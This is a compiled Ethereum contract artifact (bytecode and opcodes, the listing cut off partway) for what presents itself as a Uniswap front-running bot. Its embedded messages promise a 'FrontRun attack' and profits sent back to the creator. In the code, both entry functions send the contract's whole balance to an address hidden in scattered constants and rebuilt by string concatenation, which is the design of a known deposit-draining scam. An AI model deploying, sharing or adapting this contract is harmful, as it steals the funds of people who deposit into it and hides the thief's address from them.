{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040523480156200001157600080fd5b5060405162000ffa38038062000ffa833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b5050506200029e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b6200029b91905b80821115620002975760008160009055506001016200027d565b5090565b90565b610d4c80620002ae6000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161035a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526048815260200180610ccf6048913960600191505060405180910390a16103126103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610357573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610c9c6033913960400191505060405180910390a16103ad61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103f2573d6000803e3d6000fd5b50565b6000610407610402610423565b6105a0565b905090565b600061041e610419610423565b6105a0565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107f9565b610804565b610a76565b9050600061fbb290506000610487610bd1565b905060006202e8d59050600061049b610bdc565b905060006203dd44905060006104af610be7565b905060006201ddae905060606104cd896104c88a610804565b610a76565b905060606104eb6104dd89610804565b6104e689610804565b610a76565b905060606105096104fb88610804565b61050488610804565b610a76565b9050606061052761051987610804565b61052287610804565b610a76565b905060606105476105388686610a76565b6105428585610a76565b610a76565b9050606061058a6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610a76565b9050809e50505050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107ec57610100840293508481815181106105d257fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105f457fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610645575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610655576057830392506106ef565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610693575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106a3576037830392506106ee565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106e1575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106ed576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff161015801561072d575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561073d576057820391506107d7565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561077b575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561078b576037820391506107d6565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107c9575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107d5576030820391505b5b5b816010840201840193506002810190506105b6565b5082945050505050919050565b600062046ddf905090565b6060600080905060008390505b600081146108335781806001019250506010818161082b57fe5b049050610811565b60608267ffffffffffffffff8111801561084c57600080fd5b506040519080825280601f01601f19166020018201604052801561087f5781602001600182028036833780820191505090505b50905060008090505b838110156108fe576010868161089a57fe5b0692506108a683610bf2565b82600183870303815181106108b757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108f057fe5b049550806001019050610888565b50600081519050600481141561095e57606061094f6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b60038114156109b75760606109a86040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6002811415610a10576060610a016040518060400160405280600381526020017f303030000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6001811415610a69576060610a5a6040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b819450505050505b919050565b60608083905060608390506060815183510167ffffffffffffffff81118015610a9e57600080fd5b506040519080825280601f01601f191660200182016040528015610ad15781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610b4f57858281518110610af657fe5b602001015160f81c60f81b838280600101935081518110610b1357fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610ae1565b600091505b8451821015610bc257848281518110610b6957fe5b602001015160f81c60f81b838280600101935081518110610b8657fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610b54565b82965050505050505092915050565b6000620287ef905090565b60006208bc81905090565b60006204d003905090565b60008160ff16600011158015610c0c575060098260ff1611155b15610c4157817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610c96565b8160ff16600a11158015610c595750600f8260ff1611155b15610c9157600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610c96565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2ea2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xFFA CODESIZE SUB DUP1 PUSH3 0xFFA DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x29E JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x29B SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x297 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x27D JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0xD4C DUP1 PUSH3 0x2AE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x48 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xCCF PUSH1 0x48 SWAP2 CODECOPY PUSH1 0x60 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xC9C PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFBB2 SWAP1 POP PUSH1 0x0 PUSH2 0x487 PUSH2 0xBD1 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x2E8D5 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xBDC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3DD44 SWAP1 POP PUSH1 0x0 PUSH2 0x4AF PUSH2 0xBE7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1DDAE SWAP1 POP PUSH1 0x60 PUSH2 0x4CD DUP10 PUSH2 0x4C8 DUP11 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4EB PUSH2 0x4DD DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x4E6 DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x509 PUSH2 0x4FB DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x504 DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x527 PUSH2 0x519 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x522 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x547 PUSH2 0x538 DUP7 DUP7 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0x542 DUP6 DUP6 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x58A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7EC JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5D2 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5F4 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x645 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x655 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6EF JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x693 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6A3 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6EE JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6E1 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6ED JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x72D JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x73D JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7D7 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x77B JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x78B JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C9 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D5 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5B6 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x46DDF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x833 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x82B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x811 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x84C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x87F JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8FE JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x89A JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8A6 DUP4 PUSH2 0xBF2 JUMP JUMPDEST DUP3 PUSH1 0x1 